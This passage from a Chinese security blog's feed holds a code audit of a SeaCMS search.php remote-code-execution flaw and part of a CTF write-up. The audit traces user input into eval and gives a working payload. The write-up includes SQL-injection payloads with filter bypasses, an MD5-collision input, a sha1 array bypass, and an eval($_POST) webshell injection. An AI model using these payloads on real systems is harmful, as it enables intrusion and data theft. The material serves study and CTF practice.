class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#common.php 第29-43行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_RunMagicQuotes</span><span class="params">(&amp;$svar)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( is_array($svar) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">foreach</span>($svar <span class="keyword">as</span> $_k =&gt; $_v) $svar[$_k] = _RunMagicQuotes($_v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$svar = addslashes($svar);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $svar;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对键值进行了转义处理</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>下面来到关键的存在漏洞的<code>search.php</code>下，在开头还看到了一处过滤点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#search.php 第6-10行</span></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $k=&gt;$v)</span><br><span class="line">&#123;</span><br><span class="line">$$k=_RunMagicQuotes(gbutf8(RemoveXSS($v)));</span><br><span class="line">$schwhere.= <span class="string">"&amp;$k="</span>.urlencode($$k);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>RemoveXSS</code>函数是ThinkPHP框架中用来预防XSS攻击的过滤函数，并经过<code>_RunMagicQuotes</code>的转义处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#search.php 第54-58行</span></span><br><span class="line"><span class="keyword">if</span>($searchword==<span class="string">''</span>&amp;&amp;$searchtype!=<span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">ShowMsg(<span class="string">'关键字不能为空！'</span>,<span class="string">'index.php'</span>,<span class="string">'0'</span>,$cfg_search_time*<span class="number">1000</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">echoSearchPage();</span><br></pre></td></tr></table></figure><p>在执行漏洞函数<code>echoSearchPage</code>之前，必须满足<code>$earchtype==5</code>的条件</p><p>命令执行漏洞存在于函数<code>echoSearchPage</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echoSearchPage</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">$order = !<span class="keyword">empty</span>($order)?$order:time;</span><br><span class="line">...</span><br><span class="line">$content = str_replace(<span class="string">"&#123;searchpage:page&#125;"</span>,$page,$content);</span><br><span class="line">$content = str_replace(<span class="string">"&#123;seacms:searchword&#125;"</span>,$searchword,$content);</span><br><span class="line">$content = str_replace(<span class="string">"&#123;seacms:searchnum&#125;"</span>,$TotalResult,$content);</span><br><span class="line">$content = str_replace(<span class="string">"&#123;searchpage:ordername&#125;"</span>,$order,$content);</span><br><span class="line">...</span><br><span class="line">$content=$mainClassObj-&gt;parseIf($content);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上代码是该函数漏洞存在的关键语句，至于为什么存在漏洞，我们继续跟踪函数<code>parseIf</code>就能明白</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/include/main.class.php 第3098行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseIf</span><span class="params">($content)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos($content,<span class="string">'&#123;if:'</span>)=== <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> $content;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$labelRule = buildregx(<span class="string">"&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;"</span>,<span class="string">"is"</span>);</span><br><span class="line">$labelRule2=<span class="string">"&#123;elseif"</span>;</span><br><span class="line">$labelRule3=<span class="string">"&#123;else&#125;"</span>;</span><br><span class="line">preg_match_all($labelRule,$content,$iar);</span><br><span class="line">$arlen=count($iar[<span class="number">0</span>]);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">for</span>($m=<span class="number">0</span>;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">            $strIf=$iar[<span class="number">1</span>][$m];</span><br><span class="line">            $strIf=<span class="keyword">$this</span>-&gt;parseStrIf($strIf);</span><br><span class="line">            $strThen=$iar[<span class="number">2</span>][$m];</span><br><span class="line">            $strThen=<span class="keyword">$this</span>-&gt;parseSubIf($strThen);</span><br><span class="line">            <span class="keyword">if</span> (strpos($strThen,$labelRule2)===<span class="keyword">false</span>)&#123;</span><br><span class="line">                ...</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="string">"if("</span>.$strIf.<span class="string">") &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;"</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>上述关键性代码中，很简单明了看出了最终漏洞存在语句<code>@eval(&quot;if(&quot;.$strIf.&quot;) { \$ifFlag=true;} else{ \$ifFlag=false;}&quot;)</code>，知道了漏洞存在点，我们就一步步的追溯回去。</p><p>首先跟踪变量<code>$strIf</code>，在<code>$strIf=$iar[1][$m];</code>语句中对其进行赋值，变量<code>$iar[1]</code>又是什么，我们继续跟踪，在语句<code>preg_match_all($labelRule,$content,$iar);</code>中，通过正则匹配函数<code>preg_match_all</code>将匹配结果赋值给了数组变量<code>$iar</code>，函数中的第二个参数，即匹配的字符串，即为传入的变量<code>$content</code>，第一个参数，即匹配规则变量<code>$labelRule = buildregx(&quot;{if:(.*?)}(.*?){end if}&quot;,&quot;is&quot;)</code>，<code>bulidregx</code>函数作用是创建正则匹配规则表达式，则最后匹配规则为<code>/{if:(.*?)}(.*?){end if}/is</code>，匹配结果<code>$iar</code>数组<code>[0]</code>为所有匹配结果，<code>[1]</code>为匹配规则中第一个括号中内容匹配结果，<code>[2]</code>为匹配规则中第二个括号中内容匹配结果。另外<code>(.*?)</code>代表贪婪匹配。所以，匹配字符串一定要包含的内容有<code>{if:}{end if}</code>，不包含<code>{else if</code>，那么匹配到的第一个括号内容，即<code>$iar[1]</code>内容就会被传入<code>eval</code>函数中执行</p><p>现在理清一下思路，目前已知，命令执行的条件是我们传入的参数<code>$content</code>必须符合正则匹配内容，并且将第一个括号里的内容作为命令执行，我们这里可以先思考一下，传入什么内容进行getshell，就目前而已，传入<code>$content</code>带有<code>{if:1)phpinfo();if(1}{end if}</code>，拼接到<code>eval</code>函数中为<code>@eval(&quot;if(1)phpinfo();if(1) { \$ifFlag=true;} else{ \$ifFlag=false;}&quot;);</code>，即可getshell</p><p>所以，我们接下来回到<code>search.php</code>文件的函数下<code>echoSearchPage</code>，跟踪<code>$content</code>变量即可，其实从上面的关键代码，我们就可以猜到，<code>$content</code>实际上就是一个网站模板，内容来自于<code>/data/cache</code>下面，然后再通过<code>str_replace</code>函数对模板内容进行替换，在<code>echoSearchPage</code>函数的开头，我们就发现变量<code>$order = !empty($order)?$order:time;</code>而该变量可以通过POST和GET的方式获取到，如果是GET，则又XSS过滤和转义处理，如果是POST，则只有转义处理。之后，通过语句<code>$content = str_replace(&quot;{searchpage:ordername}&quot;,$order,$content);</code>对模板中的<code>{searchpage:ordername}</code>进行了替换</p><p>以下取自模板文件中的代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/seacms/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么，如果我们传入参数<code>order</code>为上面的getshell内容即<code>order={if:1)phpinfo();if(1}{end if}</code>，那么替换到模板中，即<code>$content</code>包含的内容<code>{if:&quot;{if:1)phpinfo();if(1}{end if}&quot;==&quot;time&quot;}</code>，那么，传入<code>parseIf</code>函数，经过正则匹配的内容，就为<code>$iar[0][m]={if:&quot;{if:1)phpinfo();if(1}{end if}</code>，<code>$iar[1][m]=&quot;{if:1)phpinfo();if(1</code>，最后拼接到<code>eval</code>函数中为<code>@eval(&quot;if({if:1)phpinfo();if(1) { \$ifFlag=true;} else{ \$ifFlag=false;}&quot;);</code>，很明显会导致执行失败，因为原来的模板中还包含了个<code>{if:</code></p><p>我们可以通过在源代码中加入测试语句即可发现：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/seacms/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>所以我们还要想办法，闭合前面的<code>{if:</code>，最终payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST:searchtype=5&amp;order=&#125;&#123;end if&#125;&#123;if:1)phpinfo();if(1&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure><p>最终执行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/seacms/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>纠其漏洞根本，还是对用户输入参数未过滤完全，为什么这里选择参数<code>$order</code>，一开始我也有这个疑问，这里明明不止替换这一个模板参数，但是经过尝试其他参数如<code>$area,$year</code>等，发现都无法执行，这时我们来到文件开头部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$searchword = RemoveXSS(stripslashes($searchword));</span><br><span class="line">$searchword = addslashes(cn_substr($searchword,<span class="number">20</span>));</span><br><span class="line">$searchword = trim($searchword);</span><br><span class="line"></span><br><span class="line">$jq = RemoveXSS(stripslashes($jq));</span><br><span class="line">$jq = addslashes(cn_substr($jq,<span class="number">20</span>));</span><br><span class="line"></span><br><span class="line">$area = RemoveXSS(stripslashes($area));</span><br><span class="line">$area = addslashes(cn_substr($area,<span class="number">20</span>));</span><br><span class="line"></span><br><span class="line">$year = RemoveXSS(stripslashes($year));</span><br><span class="line">$year = addslashes(cn_substr($year,<span class="number">20</span>));</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以发现，这些参数都经过<code>RemoveXSS</code>的过滤，而我们payload中的参数<code>order</code>，我们可以全局搜索一下，除了转义以外，未做任何过滤处理，所以最简单的修复该漏洞方法，我觉得应该就是添加上对参数<code>order</code>的<code>RemoveXSS</code>函数过滤</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>最后附上参考文章：<a href="https://bbs.ichunqiu.com/thread-35085-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-35085-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>上海&quot;嘉伟思杯&quot;ctf</title>
    <link href="https://Foxgrin.github.io//posts/45634/"/>
    <id>https://Foxgrin.github.io//posts/45634/</id>
    <published>2019-03-31T07:15:00.000Z</published>
    <updated>2019-03-31T07:26:48.562Z</updated>
    
    <content type="html"><![CDATA[<p>上海ctf WriteUp<a id="more"></a></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="土肥原贤二"><a href="#土肥原贤二" class="headerlink" title="土肥原贤二"></a>土肥原贤二</h3><p>题目链接：<a href="http://47.103.43.235:81/quest/web/a/index.php" target="_blank" rel="noopener">http://47.103.43.235:81/quest/web/a/index.php</a></p><p>SQL注入题，没有过滤特殊字符，gid通过单引号包裹，采用联合查询注入</p><p>payload：<code>?gid=0&#39;%20union%20select%201,(select%20flag%20from%20flag),3,4%23</code></p><p>flag:<code>flag{20_welcome_19}</code></p><h3 id="吴佩孚"><a href="#吴佩孚" class="headerlink" title="吴佩孚"></a>吴佩孚</h3><p>题目链接：<a href="http://47.103.43.235:85/b/%E7%AC%AC%E4%B8%80%E9%A2%98_js%EF%BC%9F.txt" target="_blank" rel="noopener">http://47.103.43.235:85/b/%E7%AC%AC%E4%B8%80%E9%A2%98_js%EF%BC%9F.txt</a></p><p>给了一串字符，经过<strong>base64解密</strong>后，得到一串<strong>jsfuck</strong>代码，经过网站<a href="https://www.bugku.com/tools/jsfuck/解密后得到flag" target="_blank" rel="noopener">https://www.bugku.com/tools/jsfuck/解密后得到flag</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\上海ctf\1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>flag:<code>flag{sdf465454dfgert32}</code></p><h3 id="戴星炳"><a href="#戴星炳" class="headerlink" title="戴星炳"></a>戴星炳</h3><p>题目链接：<a href="http://47.103.43.235:82/web/a/index.php" target="_blank" rel="noopener">http://47.103.43.235:82/web/a/index.php</a></p><p>题目意思是计算一串公式，但是每次刷新页面公式内容都会变化，所以要通过python的Session机制提交计算结果，脚本代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">"http://47.103.43.235:82/web/a/index.php"</span></span><br><span class="line">r = s.get(url)</span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line">a = re.findall(<span class="string">'&lt;p&gt;(.*)&lt;/p&gt;'</span>,str(soup.find_all(<span class="string">'p'</span>)[<span class="number">1</span>]))[<span class="number">0</span>]</span><br><span class="line">result = eval(a)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'result'</span>:result</span><br><span class="line">    &#125;</span><br><span class="line">r1 = s.post(url,data=data)</span><br><span class="line">print(r1.text)</span><br></pre></td></tr></table></figure><p>flag:<code>flag{Y0U_4R3_3o_F4ST!}</code></p><h3 id="晴气庆胤"><a href="#晴气庆胤" class="headerlink" title="晴气庆胤"></a>晴气庆胤</h3><p>题目链接：<a href="http://47.103.43.235:85/a/" target="_blank" rel="noopener">http://47.103.43.235:85/a/</a></p><p>源代码给出了提示：<code>if ((string)$_POST[&#39;paraml&#39;]!==(string)$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;paraml&#39;])===md5($_POST[&#39;param2&#39;]))</code></p><p>要提交两个md5值完全相等的参数，参考链接<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">https://xz.aliyun.com/t/2232</a></p><p>通过链接中的<strong>fastcoll_v1.0.0.5.exe</strong>文件，使用命令<code>fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\上海ctf\2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>生成<code>1.txt</code>和<code>2.txt</code>两个文件</p><p>再通过以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">"rb"</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash '</span>. md5( (readmyfile(<span class="string">"1.txt"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>. urlencode(readmyfile(<span class="string">"1.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5(urlencode (readmyfile(<span class="string">"1.txt"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash '</span>.md5( (readmyfile(<span class="string">"2.txt"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.  urlencode(readmyfile(<span class="string">"2.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5( urlencode(readmyfile(<span class="string">"2.txt"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br></pre></td></tr></table></figure><p>生成两个hash一样，但是实际内容不一样的字符串</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\上海ctf\3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>将这两串字符分别提交，获得flag，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyrer%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EF%F5%7C9%D5K%BAK%C6%C7N%3Be%93%F8P%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BCz%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8%E4%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9E%F4%EFzG%9B&amp;param2=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyr%E5r%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EFu%7D9%D5K%BAK%C6%C7N%3Be%93%F8%D0%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BC%FA%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8d%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9Et%EFzG%9B</span><br></pre></td></tr></table></figure><p>flag:<code>flag{MD5@_@success}</code></p><h3 id="冈村宁次"><a href="#冈村宁次" class="headerlink" title="冈村宁次"></a>冈村宁次</h3><p>题目链接：<a href="http://47.103.43.235:83/web/a/index.php?id===QM" target="_blank" rel="noopener">http://47.103.43.235:83/web/a/index.php?id===QM</a></p><p>查询结果的id字段为1，而1的base64加密结果为<code>MQ==</code>，说明id参数的值经过base64解密后再反转再添加到SQL语句中，在py命令行中使用<code>base64.b64encode(&#39;&#39;)[::-1]</code>进行base64加密再反转效果</p><p>经过测试，这题对<code>sleep,extractvalue,updatexml</code>函数进行了检查，检查到再最前面添加<code>1</code>，所以无法使用报错和延时注入</p><p>另外过滤了<code>or,select,union,空格,逗号，等号</code>，绕过方法分别为：（1）双写or，select，union（2）用<code>/**/</code>代替空格（3）用<code>select()a join select ()b</code>代替逗号（4）用<code>like，regexp</code>代替等号</p><p>爆数据库payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(<span class="string">'0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/6)f)'</span>)[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><p>数据库名：<code>ctf_sql</code></p><p>爆表名payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/database())f)&quot;)[::-1]</span><br></pre></td></tr></table></figure><p>表名：<code>book,flag</code></p><p>爆列名payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/0x666c6167)f)&quot;)[::-1]</span><br></pre></td></tr></table></figure><p>列名：<code>flag</code></p><p>爆flag payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/flag/**/from/**/flag)f)&quot;)[::-1]</span><br></pre></td></tr></table></figure><p>flag：<code>flag{s9li_1s_s0_e4sY}</code></p><h3 id="作战计划"><a href="#作战计划" class="headerlink" title="作战计划"></a>作战计划</h3><p>题目链接：<a href="http://47.103.43.235:84" target="_blank" rel="noopener">http://47.103.43.235:84</a></p><p>海洋cms，之前就爆出的<code>search.php</code>存在命令执行漏洞，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.43.235:84/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])</span><br></pre></td></tr></table></figure><p>通过菜刀连接后，在根目录下找到<code>flag.txt</code>，获得flag</p><p>flag：<code>flag{!!seacms_@@}</code></p><h3 id="池步洲"><a href="#池步洲" class="headerlink" title="池步洲"></a>池步洲</h3><p>题目链接：<a href="http://47.103.43.235:82/web/b/index.php" target="_blank" rel="noopener">http://47.103.43.235:82/web/b/index.php</a></p><p>源代码给出提示文件<code>index.phps</code>，访问后下载获得源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'********'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">'name'</span>] == $_POST[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'name and password must be diffirent'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_POST[<span class="string">'name'</span>]) === sha1($_POST[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>($flag);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">print</span> <span class="string">'invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sha1函数无法处理数组，通过传入两个数组即可绕过过滤，payload：<code>name[]=1&amp;password[]=2</code></p><p>flag：<code>flag{Y0u_just_br0ke_sha1}</code></p><h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="日军空袭"><a href="#日军空袭" class="headerlink" title="日军空袭"></a>日军空袭</h3><p>题目链接：<a href="http://47.103.43.235:82/crypto/a/index.php" target="_blank" rel="noopener">http://47.103.43.235:82/crypto/a/index.php</a></p><p>页面给了一串看似base64加密后的字符串，经过一次base64解密发现末尾出现了<code>$3D</code>说明可能还存在URL编码，所以需要URL和base64循环解码，脚本代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">s = <span 